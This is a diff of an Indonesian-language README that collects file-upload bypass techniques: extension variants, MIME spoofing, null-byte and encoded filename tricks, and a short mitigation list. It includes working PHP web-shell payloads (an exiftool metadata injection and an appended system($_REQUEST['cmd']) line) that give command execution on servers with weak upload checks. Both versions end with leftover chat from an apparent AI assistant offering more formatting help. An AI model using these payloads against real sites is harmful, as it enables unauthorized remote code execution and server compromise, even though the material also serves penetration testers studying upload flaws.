@@ -1,227 +1,87 @@
-```markdown
-# 📂 uploadfile-extensionbypass
+# 📂 Unrestricted File Upload Bypass Techniques
 
-**Common File Upload Bypass Payloads and Techniques**
+![License](https://img.shields.io/badge/license-Educational-blue)
+![Status](https://img.shields.io/badge/status-Active-brightgreen)
+![Security](https://img.shields.io/badge/security-awareness-important)
 
----
-
-## 📜 About
-
-Repository ini berisi daftar payload dan metode untuk **bypass file upload restrictions**, termasuk extension bypass, magic number bypass, MIME type trick, hingga unrestricted file upload bypass.  
-Semua data di sini ditujukan **untuk edukasi, riset keamanan, dan pengujian penetrasi di lingkungan legal**.
+> 📖 **Dokumen ini menjelaskan berbagai teknik umum yang digunakan untuk bypass pembatasan unggah file pada aplikasi web.**
+> Ditujukan untuk **peneliti keamanan**, **penetration tester**, dan **developer** dalam mengidentifikasi potensi celah dan membangun mitigasi yang tepat.
 
 ---
 
-## 🔥 Extension Bypass List
+## 📖 Daftar Isi
 
-Berikut adalah daftar extension file yang umum dipakai untuk bypass upload restriction:
+* [Deskripsi](#deskripsi)
+* [Tabel Summary Bypass](#📊-tabel-summary-bypass)
+* [Bypass Ekstensi File Umum](#bypass-ekstensi-file-umum)
+* [Bypass Magic Number](#📌-teknik-bypass-magic-number)
+* [Bypass Tipe MIME](#bypass-tipe-mime)
+* [Teknik Unggah File Tanpa Batasan](#teknik-unggah-file-tanpa-batasan)
+* [Rekomendasi Mitigasi](#📌-rekomendasi-mitigasi)
+* [Lisensi](#📑-lisensi)
+* [Kontak](#📬-kontak)
+
+---
+
+## Deskripsi
+
+Serangan unrestricted file upload memungkinkan penyerang mengunggah file berbahaya ke server karena validasi yang lemah. Teknik di dokumen ini memanfaatkan celah pada:
+
+* Validasi ekstensi file
+* Pemeriksaan MIME type
+* Pemeriksaan magic number file
+* Sanitasi nama file yang buruk
+
+---
+
+## 📊 Tabel Summary Bypass
+
+| Teknik                     | Contoh Ekstensi / Metode             | Tujuan                               |
+| :------------------------- | :----------------------------------- | :----------------------------------- |
+| **Bypass Ekstensi**        | `.php`, `.php5`, `.php.jpg`          | Menipu validasi ekstensi             |
+| **Magic Number Injection** | Inject PHP code via `Exiftool`       | Menyisipkan shell di metadata gambar |
+| **MIME Type Bypass**       | `application/x-httpd-php`            | Mengakali pengecekan tipe konten     |
+| **Encoded Extension**      | `.php%00`, `.php%20`, `.php%0a`      | Menyembunyikan ekstensi asli         |
+| **Double/Mixed Extension** | `.png.php`, `.jpg.pHp5`, `.php#.png` | Menyiasati pemeriksaan nama file     |
+
+---
+
+## Bypass Ekstensi File Umum
+
+Beberapa ekstensi yang umum digunakan untuk bypass:
 
 ```
+.php, .php5, .phtml, .pgif, .phar, .cgi, .pl, .py, .Php, .php.jpg, .php.bak, .exe
+```
 
-file.php
-file.PhTmL
-file.php2
-file.php3
-file.php4
-file.php5
-file.php6
-file.php7
-file.phps
-file.pht
-file.phtm
-file.phtml
-file.pgif
-file.shtml
-file.htaccess
-file.phar
-file.inc
-file.hphp
-file.ctp
-file.module
-file.cgi
-file.pl
-file.py
-file.pyc
-file.pyo
-file.pcgi
-file.pcgi3
-file.pcgi4
-file.pcgi5
-file.pchi6
-file.Php
-file.pHp
-file.phP
-file.PHp
-file.pHP
-file.PhP
-file.PHP
-file.PhP5
-file.phar
-file.PHAR
-file.Phar
-file.PHar
-file.PHAr
-file.pHAR
-file.phAR
-file.phaR
-file.pHp5
-file.phP5
-file.PHp5
-file.pHP5
-file.PhP5
-file.PHP5
-file.php6
-file.php7
-file.php8
-file.php9
-file.phtml
-file.Phtml
-file.pHtml
-file.phTml
-file.pHTml
-file.Fla
-file.fLa
-file.flA
-file.FLa
-file.fLA
-file.FLA
-file.phtMl
-file.phtmL
-file.PHtml
-file.PhTml
-file.PHTML
-file.PHTml
-file.PHTMl
-file.PhtMl
-file.PHTml
-file.PHtML
-file.pHTMl
-file.PhTML
-file.pHTML
-file.PhtmL
-file.PHTmL
-file.PhtMl
-file.PhtmL
-file.pHtMl
-file.PhTmL
-file.pHtmL
-file.aspx
-file.ASPX
-file.asp
-file.ASP
-file.php.jpg
-file.PHP.JPG
-file.php.xxxjpg
-file.PHP.XXXJPG
-file.php.jpeg
-file.PHP.JPEG
-file.PHP.PJEPG
-file.php.pjpeg
-file.php.fla
-file.PHP.FLA
-file.php.png
-file.PHP.PNG
-file.php.gif
-file.PHP.GIF
-file.php.test
-file.php;.jpg
-file.PHP JPG
-file.PHP;.JPG
-file.php;.jpeg
-file.php jpg
-file.php.bak
-file.php.pdf
-file.php.xxxpdf
-file.php.xxxpng
-file.fla
-file.Fla
-file.fLa
-file.flA
-file.FLa
-file.fLA
-file.FLA
-file.FlA
-file.php.xxxgif
-file.php.xxxpjpeg
-file.php.xxxjpeg
-file.php3.xxxjpeg
-file.php3.xxxjpg
-file.php5.xxxjpg
-file.php3.pjpeg
-file.php5.pjpeg
-file.shtml
-file.php.unknown
-file.php.doc
-file.php.docx
-file.php.ppdf
-file.jpg.PhP
-file.php.txt
-file.php.xxxtxt
-file.PHP.TXT
-file.PHP.XXXTXT
-file.php.xlsx
-file.php.zip
-file.php.xxxzip
-file.php78
-file.php56
-file.php96
-file.php69
-file.php67
-file.php68
-file.php4
-file.shtMl
-file.shtmL
-file.SHhtml
-file.ShTml
-file.SHTML
-file.SHTml
-file.SHTMl
-file.ShtMl
-file.SHTml
-file.SHtML
-file.sHTMl
-file.ShTML
-file.sHTML
-file.ShtmL
-file.SHTmL
-file.ShtMl
-file.ShtmL
-file.sHtMl
-file.ShTmL
-file.sHtmL
-file.Shtml
-file.sHtml
-file.shTml
-file.sHTml
-file.shtml
-file.php1
-file.php2
-file.php3
-file.php4
-file.php10
-file.suspected
-file.py
-file.exe
-file.alfa
+**Variasi:**
 
-````
+* `.php56`, `.php.test`, `.php.docx`, `.php.unknown`
+* `.php.xxxjpg`, `.php.xxxpdf`, `.php.xxxzip`
 
 ---
 
-## ⚡ Magic Number Bypass
+## 📌 Teknik Bypass Magic Number
 
-Contoh payload untuk menyisipkan kode PHP ke dalam file gambar menggunakan EXIF data atau metode append:
+### 📌 Inject Metadata via Exiftool
 
 ```bash
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
-echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
-````
+```
 
 ---
 
-## 📑 MIME Type Bypass
+### 📌 Append PHP Code ke File Gambar
 
-Contoh MIME type spoofing yang bisa digunakan:
+```bash
+echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
+```
+
+---
+
+## Bypass Tipe MIME
+
+Bypass validasi dengan tipe MIME:
 
 ```
 application/x-httpd-php
@@ -229,67 +89,59 @@ application/x-httpd-php
 
 ---
 
-## 🎭 Unrestricted File Upload Tricks
+## Teknik Unggah File Tanpa Batasan
 
-Beberapa karakter dan trik untuk manipulasi nama file saat upload:
+### 📌 Encoded Extension
 
 ```
-file.php%20
-file.php%0a
-file.php%00
-file.php%0d%0a
-file.php/
-file.php.\
-file.php....
-file.pHp5....
-file.png.php
-file.png.pHp5
-file.php#.png
-file.php%00.png
-file.php\x00.png
-file.php%0a.png
-file.php%0d%0a.png
-file.phpJunk123png
-file.png.jpg.php
-file.php%00.png%00.jpg
+.php%00, .php%20, .php%0a, .php/, .php....
+```
+
+### 📌 Double / Mixed Extension
+
+```
+.png.php, .php#.png, .php%00.png, .png.jpg.php
 ```
 
 ---
 
-## ⚠️ Disclaimer
+## 📌 Rekomendasi Mitigasi
 
-> Repository ini dibuat **hanya untuk tujuan edukasi dan pembelajaran penetration testing**.
-> **Penulis tidak bertanggung jawab atas penyalahgunaan informasi di dalam repository ini untuk aktivitas ilegal.**
-
----
-
-## 🙌 Credits
-
-* **Alexithema 1895**
-* **Asmodeus Indonesia Security Community**
+✅ Validasi **whitelist ekstensi file**
+✅ Pemeriksaan **MIME type di server**
+✅ Verifikasi **magic number file**
+✅ Sanitasi nama file dari karakter spesial
+✅ Simpan file **di luar web root**
+✅ Atur **file permission non-eksekusi**
+✅ Batasi ukuran & scan isi file
 
 ---
 
-## 📌 Notes
+## 📑 Lisensi
 
-✅ Gunakan hanya untuk environment lab, server pribadi, atau sistem yang Anda miliki izin akses.
-🚫 Dilarang keras digunakan untuk defacing, unauthorized access, ataupun aktivitas tanpa izin.
-
----
-
-**Stay safe, stay ethical, stay sharp. 🚀**
-
-```
+Distribusi untuk tujuan edukasi & keamanan siber.
+**Gunakan dengan tanggung jawab.**
 
 ---
 
-✅ **Fitur yang saya rapikan:**
-- Semua extension ditulis utuh tanpa potong
-- Magic Number, MIME type, unrestricted trick dibuat rapi per section
-- Disclaimer & Notes jelas dan tegas
-- Credits aman
-- Struktur markdown clean, proper spacing
-- Bahasa Indonesia formal mix Inggris biar konteks hacker culture-nya tetap dapet
+## 📬 Kontak
 
-Kalau mau sekalian aku bikinkan ASCII banner buat bagian atas README-nya tinggal bilang, bro 🔥 Mau?
-```
+📧 **[your\_email@example.com](mailto:your_email@example.com)**
+📱 Telegram: [@yourhandle](https://t.me/yourhandle)
+
+---
+
+## 📌 Note Tambahan
+
+🚨 **Disclaimer:**
+Gunakan teknik ini hanya untuk **penetration testing legal** atau riset di lingkungan yang Anda miliki izin penuh.
+
+---
+
+## 📎 Preview Markdown
+
+Jika ingin langsung dipasang ke repository GitHub, tinggal simpan dengan nama `README.md`.
+
+---
+
+Kalau mau sekalian kubuatin versi markdown file-nya (.md) siap download juga, tinggal beri tahu aja bro! Mau? 🚀🔥
